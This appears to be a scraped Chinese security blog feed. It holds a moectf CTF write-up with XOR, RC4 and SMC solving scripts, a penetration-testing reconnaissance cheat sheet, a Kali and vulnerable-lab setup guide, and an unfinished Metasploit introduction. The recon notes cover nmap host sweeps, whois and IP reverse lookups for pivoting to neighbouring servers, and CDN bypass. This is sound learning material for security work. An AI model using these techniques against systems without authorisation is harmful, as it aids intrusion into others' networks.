src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911112024117.png" alt="image-20230911112024117"></p><p>0x03</p><p>这个也是一个异或加密</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911113103047.png" alt="image-20230911113103047"></p><p>就是请注意，如果是0x00使用chr的话，可能会只有一个0，所以需要人工的补上</p><h2 id="RRRRRc4"><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h2><p>由名字可见这个是RC4加密，我们只需要找到对应的密钥和密文就好了</p><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911130441753.png" alt="image-20230911130441753"></p><p>红色部分是加密部分</p><p>蓝色部分是密文，我们将它换成16进制字符串</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911130538113.png" alt="image-20230911130538113"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><br>temp=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])==<span class="hljs-number">1</span> :<br>        temp+=<span class="hljs-string">&#x27;0&#x27;</span><br>    temp+=<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <br>        <br><span class="hljs-built_in">print</span>(temp) <br></code></pre></td></tr></table></figure><p>0x02</p><p>然后将密文放入解密就行了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911130710023.png" alt="image-20230911130710023"></p><h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><p>可以通过名字可以看出这个是SMC加密</p><p>0x01</p><p>然后然后IDA分析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230912132154868.png" alt="image-20230912132154868"></p><p>这个函数就是加密的函数，点进去看看是怎么加密的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230912132450529.png" alt="image-20230912132450529"></p><p>可以看到加密的地址是0x4014d0</p><p>然后长度是122</p><p>0x02</p><p>通过加密的逆操作，得出答案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">start=<span class="hljs-number">0x4014D0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">122</span>):<br>    patch_byte(start+i,Byte(start+i)^<span class="hljs-number">0x66</span>)<br><br>start=<span class="hljs-number">0x4014d0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">122</span>):<br>    patch_byte(start+i,Byte(start+i)^<span class="hljs-number">0x66</span>)<br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Misc-入门指北"><a href="#Misc-入门指北" class="headerlink" title="Misc 入门指北"></a>Misc 入门指北</h2><p>下载完了，以后你就可以发现存在密码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921221532421.png" alt="image-20230921221532421"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921221503407.png" alt="image-20230921221503407"></p><h2 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a>打不开的图片1</h2><p>0x01</p><p>看名字发现可能和文件头有关</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921221921193.png" alt="image-20230921221921193"></p><p>0x02</p><p>在图片的属性里面找到主题，然后解码，就行<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectfimage-20231004005924801.png" alt="image-20231004005924801"></p><h2 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a>打不开的图片2</h2><p>注意简绍</p><p>0x01</p><p>首先我们看简绍，牛头不对马嘴</p><p>我就想应该是文件头和尾不能匹配</p><p>然后发现是png的文件尾</p><p>0x02</p><p>将文件头改成png格式的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20231013085554772.png" alt="image-20231013085554772"></p><p>出结果</p><h2 id="狗子（1）普通的猫"><a href="#狗子（1）普通的猫" class="headerlink" title="狗子（1）普通的猫"></a>狗子（1）普通的猫</h2><p>将文件放进010，然后最后</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20231013090604573.png" alt="image-20231013090604573"></p><h1 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h1><p>0x01</p><p>打开在线的环境</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF比赛记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集方法集合</title>
    <link href="/2023/09/04/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95%E9%9B%86%E5%90%88/"/>
    <url>/2023/09/04/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95%E9%9B%86%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h1><h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><ol><li><p>whois</p><p>可以查到注册人的相关信息</p><ul><li><p>接口查询</p><p><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a>  </p><p><a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a>  </p><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a>  </p></li><li><p>python脚本查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br>     <br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;input domain: &quot;</span>)<br>     <br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&#x27;whois.internic.net&#x27;</span>, <span class="hljs-number">43</span>))<br>s.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;domain&#125;</span>\r\n&#x27;</span>.encode())<br>     <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    v = s.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> v:<br>        <span class="hljs-keyword">break</span><br>    decoded = v.decode()<br>    <span class="hljs-built_in">print</span>(decoded)<br>     <br>s.close()<br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>whois反查</p><blockquote><p><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></p></blockquote><p>  域名反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=0">https://whois.chinaz.com/reverse?ddlSearchMode=0</a></p><p>  邮箱反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=1">https://whois.chinaz.com/reverse?ddlSearchMode=1</a></p><p>  注册人反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=2">https://whois.chinaz.com/reverse?ddlSearchMode=2</a></p><p>  电话反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=3">https://whois.chinaz.com/reverse?ddlSearchMode=3</a></p></li></ol><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ol><li><p>googleHacking</p></li><li><p>site:hetianlab.com</p></li><li><p>fofa</p></li><li><p>鹰图</p></li><li><p>SSL证书查询</p><p> <a href="https://crt.sh/">https://crt.sh/</a></p></li></ol><h1 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h1><ol><li><p>IP反查</p><p>  <a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a>  </p><p>如果发现正在渗透的主机是一台虚拟机，我们可以考虑反查域名，获得运行在这台主机上的其他的虚拟机或者服务器，我们就可以尝试获得其他服务器的权限，迂回得到权限</p></li><li><p>域名反查</p><p>  <a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a>  </p><p>知道一个站点的域名需要得到它的IP以便之后获取端口信息或扫描等后续工作</p></li><li><p>C端存活</p><blockquote><p>  nmap -sP <a href="http://www.xxx.com/24">www.XXX.com/24</a>  </p><p>  nmap -sP 192.168.1.*  </p></blockquote><p>也可以使用yakit</p></li></ol><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><ol><li><p>多地Ping</p><p>  <a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a>  </p></li><li><p>国外访问</p><p>  <a href="https://ping.eu/ping/">https://ping.eu/ping/</a>  </p></li><li><p>CDN绕过</p><ul><li><p>查询子域名的IP</p><p>  <a href="https://ip.tool.chinaz.com/ipbatch">https://ip.tool.chinaz.com/ipbatch</a></p></li></ul></li></ol><h1 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h1><p>黑客常用的端口</p><p><a href="https://www.cnblogs.com/bmjoker/p/8833316.html">https://www.cnblogs.com/bmjoker/p/8833316.html</a> </p><h1 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h1><ol><li><p>操作系统信息收集</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230908205706352.png" alt="image-20230908205706352"></p></li><li><p>网站类型</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>环境准备</title>
    <link href="/2023/09/03/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
    <url>/2023/09/03/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87image-20230903000210232.png" alt="image-20230903000210232"></p><p>流程</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87image-20230903000406861.png" alt="image-20230903000406861"></p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="WIN-JAVA"><a href="#WIN-JAVA" class="headerlink" title="WIN-JAVA"></a>WIN-JAVA</h3><h4 id="JDK8"><a href="#JDK8" class="headerlink" title="JDK8"></a>JDK8</h4><p>下载 JDK8:  <a href="https://www.oracle.com/java/technologies/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</a>  </p><p>主要就是使用的是JDK8</p><h3 id="WIN-PYTHON"><a href="#WIN-PYTHON" class="headerlink" title="WIN-PYTHON"></a>WIN-PYTHON</h3><ol><li><p>下载安装程序</p><blockquote><p>  <a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a>  </p><p><a href="https://www.python.org/ftp/python/">https://www.python.org/ftp/python/</a></p></blockquote></li></ol><h3 id="KALI安装"><a href="#KALI安装" class="headerlink" title="KALI安装"></a>KALI安装</h3><p>直接在官网下载，建议使用VM虚拟机</p><h4 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a>设置中文</h4><p>安装中文</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install xfonts-intl-chinese<br>sudo apt-get install ttf-wqy-microhei<br><br></code></pre></td></tr></table></figure><p>配置语言</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo dpkg-reconfigure locales<br></code></pre></td></tr></table></figure><p>重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">reboot<br></code></pre></td></tr></table></figure><h4 id="kali-java"><a href="#kali-java" class="headerlink" title="kali-java"></a>kali-java</h4><h5 id="JDK8-1"><a href="#JDK8-1" class="headerlink" title="JDK8"></a>JDK8</h5><p>下面是8U161的安装过程</p><ol><li><p>创建目录，解压文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /usr/local/java<br>sudo <span class="hljs-built_in">cp</span> jdk-8u161-linux-x64.tar.gz /usr/local/java<br><span class="hljs-built_in">cd</span> /usr/local/java<br>sudo tar xzvf jdk-8u91-linux-x64.tar.gz<br>   <br></code></pre></td></tr></table></figure></li><li><p>通知系统JAVA的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo update-alternatives --install <span class="hljs-string">&quot;/usr/bin/java&quot;</span> <span class="hljs-string">&quot;java&quot;</span> <span class="hljs-string">&quot;/usr/local/java/jdk1.8.0_161/bin/java&quot;</span> 1112<br>sudo update-alternatives --install <span class="hljs-string">&quot;/usr/bin/javac&quot;</span> <span class="hljs-string">&quot;javac&quot;</span> <span class="hljs-string">&quot;/usr/local/java/jdk1.8.0_161/bin/javac&quot;</span> 1112<br>   <br></code></pre></td></tr></table></figure></li><li><p>设置默认的java位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo update-alternatives --<span class="hljs-built_in">set</span> java /usr/local/java/jdk1.8.0_161/bin/java<br>sudo update-alternatives --<span class="hljs-built_in">set</span> javac /usr/local/java/jdk1.8.0_161/bin/javac<br>   <br></code></pre></td></tr></table></figure></li></ol><h5 id="JDK11"><a href="#JDK11" class="headerlink" title="JDK11"></a>JDK11</h5><p>JDK可以直接包管理器安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt search openjdk<br>apt install openjdk-11-jdk<br><br></code></pre></td></tr></table></figure><p>然后安装上面的步骤通知系统</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20230903164058773.png" alt="image-20230903164058773"></p><h4 id="kali-python"><a href="#kali-python" class="headerlink" title="kali-python"></a>kali-python</h4><h5 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h5><p>由于python2是kali 自己就会安装所以不需要重新安装</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20230903164305977.png" alt="image-20230903164305977"></p><p>我们只需要安装pythoon2就可以了</p><h5 id="python3-8"><a href="#python3-8" class="headerlink" title="python3.8"></a>python3.8</h5><p>安装Python所需要的依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install -y wget build-essential libreadline-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev libffi-dev zlib1g-dev<br><br></code></pre></td></tr></table></figure><p>下载python安装包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建文件夹</span><br>cd /root<br>mkdir /usr/local/python3.8<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装python并解压</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果这里很慢的话可以换源</span><br>wget https://www.python.org/ftp/python/3.8.17/Python-3.8.17.tgz<br>tar -zxf Python-3.8.17.tgz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入解压文件夹，安装python</span><br>cd Python-3.8.17<br>./configure --enable-optimizations --prefix=/usr/local/python3.8/ &amp;&amp; make &amp;&amp; make install<br><span class="hljs-meta prompt_"># </span><span class="language-bash">编译的时候我们不能操作</span><br></code></pre></td></tr></table></figure><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><h3 id="VMware虚拟网络编辑"><a href="#VMware虚拟网络编辑" class="headerlink" title="VMware虚拟网络编辑"></a>VMware虚拟网络编辑</h3><h4 id="nat模式"><a href="#nat模式" class="headerlink" title="nat模式"></a>nat模式</h4><ol><li><p>模式简绍</p><p>nat就是通过宿主机上网交换数据，此时不会占用宿主机网络的IP地址</p></li></ol><h4 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h4><ol><li><p>模式简绍</p><p>桥接模式，相当于将物理机作为一个交换机，所有使用桥接的虚拟机都是连接在这个交换机，宿主机也是</p></li></ol><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h4 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h4><ol><li><p>列出所有的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker image ls<br></code></pre></td></tr></table></figure></li><li><p>拉去镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker image pull name<br></code></pre></td></tr></table></figure></li><li><p>删除镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker image rm name/id<br></code></pre></td></tr></table></figure></li></ol><h3 id="vulhub"><a href="#vulhub" class="headerlink" title="vulhub"></a>vulhub</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/vulhub/vulhub.git<br></code></pre></td></tr></table></figure><p>需要哪一个靶场就进入到对应的文件夹后使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up -d<br></code></pre></td></tr></table></figure><h3 id="vulnapp"><a href="#vulnapp" class="headerlink" title="vulnapp"></a>vulnapp</h3><ol><li><p>打开服务器</p><blockquote><p>  <a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a>  </p></blockquote></li><li><p>查看对应的漏洞文件，然后看docker 指令</p></li></ol><h3 id="Vulfocus"><a href="#Vulfocus" class="headerlink" title="Vulfocus"></a>Vulfocus</h3><ol><li><p>通过docker 拉取镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull vulfocus/vulfocus:latest<br></code></pre></td></tr></table></figure></li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试框架</title>
    <link href="/2023/09/01/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/09/01/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试框架"><a href="#渗透测试框架" class="headerlink" title="渗透测试框架"></a>渗透测试框架</h1><h2 id="Metasploit渗透框架"><a href="#Metasploit渗透框架" class="headerlink" title="Metasploit渗透框架"></a>Metasploit渗透框架</h2><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><blockquote><p>POC: 用于证明漏洞是否存在，是<strong>没有攻击性</strong></p></blockquote><blockquote><p>EXP: <strong>Expoit</strong>，利用漏洞的攻击动作，方式，方法，<strong>具有攻击性</strong></p></blockquote><blockquote><p>PAYLOAD : 有效载荷，真正在系统进行的代码和指令</p></blockquote><blockquote><p>SHELLCODE： 利用漏洞执行的代码</p></blockquote><blockquote><p> CLIENT: 客户端</p></blockquote><blockquote><p>Team Server：服务端，C2服务器，Beacon Payload的控制器</p></blockquote><blockquote><p>Beacon：是Cobalt Strike运行在目标主机上的 payload，Beacon 在隐蔽信道上我们提供服务，用于长期控制受感染主机。</p></blockquote><blockquote><p>C2：Command &amp; Control Server的简称，也就是命令与控制服务器</p></blockquote><h3 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h3><p>The Metasploit Framework 的简称。MSF 高度模块化，即框架由多个 module 组成，是全球最受欢迎的渗透测试工具之一是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的 shellcode，并持续保持更新。metasploit 涵盖了渗透测试中全过程，你可以在这个框架下利用现有的 Payload 进行一系列的渗透测试。</p><h3 id="MSF框架结构"><a href="#MSF框架结构" class="headerlink" title="MSF框架结构"></a>MSF框架结构</h3><p>kali-metasploit框架目录路径</p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p></blockquote><blockquote><p>data: 包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件。</p></blockquote><blockquote><p>documentation：包含框架的可用文档。</p></blockquote><blockquote><p>lib：metasploit的库文件夹。</p></blockquote><blockquote><p>plugins：用来存放metasploit的插件。</p></blockquote><blockquote><p>scripts：用来存放metasploit的脚本，包括meterpreter及其它脚本。</p></blockquote><blockquote><p>tools：存放多种的命令行实用程序。</p></blockquote><blockquote><p>modules：存储metasploit的模块文件。</p></blockquote><p>更新</p><p>但是一般安装最新版的kali一般都是最新版的metasploit</p><blockquote><p>msfconsole -v # 查看版本</p><p>apt-get update</p><p>apt-get install metasploit-framework</p></blockquote><h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><p>Metasploit支持使用数据库来保存渗透测试过程中获取的各种数据</p><ol><li><p>开启数据库</p><blockquote><p>serveice postgresql start</p></blockquote></li><li><p>初始化MSD数据库</p><blockquote><p>msfdb init</p></blockquote><blockquote><p>创建数据库用户：msf</p><p>创建数据库：msf</p><p>创建数据库：msf_test</p><p>创建配置文件：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;config&#x2F;database.yml</p><p>创建保存MSF框架信息所需数据表</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901141403479.png" alt="image-20230901141403479"></p></li></ol><h3 id="启动msfconsole"><a href="#启动msfconsole" class="headerlink" title="启动msfconsole"></a>启动msfconsole</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br></code></pre></td></tr></table></figure><p>Msfconsole 是 Metasploit 框架用户接口，我们能通过 Msfconsole 接口使用 Metasploit 中所有模块</p><p>msfconsole作用</p><ol><li><p>管理Metasploit数据库</p></li><li><p>管理会话</p></li><li><p>配置启动Metasploit模块</p></li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901142007898.png" alt="image-20230901142007898"></p><p>启动msfconsole时，MSF会使用创建MSF用户子哦对那个登录到数据库</p><p>通过db_status检查数据库的状态</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901142212998.png" alt="image-20230901142212998"></p><p>连接其他的数据库</p><blockquote><p>msf5 &gt; db_connect 用户名:口令**@<strong>服务器地址</strong>:<strong>端口</strong>&#x2F;**数据库名称</p></blockquote><h3 id="msf命令"><a href="#msf命令" class="headerlink" title="msf命令"></a>msf命令</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><blockquote><p><strong>show</strong> exploits – 查看所有可用的渗透攻击程序代码</p><p><strong>show</strong> auxiliary – 查看所有可用的辅助攻击工具</p><p>[<strong>show</strong>]<strong>options</strong>&#x2F;advanced – 查看该模块可用选项</p><p><strong>show</strong> payloads – 查看该模块适用的所有载荷代码</p><p><strong>show</strong> targets – 查看该模块适用的攻击目标类型</p><p><strong>search</strong> – 根据关键字搜索某模块</p><p><strong>info</strong> – 显示某模块的详细信息</p><p>use – 使用某渗透攻击模块</p><p>back – 回退</p><p><strong>set</strong>&#x2F;unset – 设置&#x2F;禁用模块中的某个参数</p><p>setg&#x2F;unsetg – 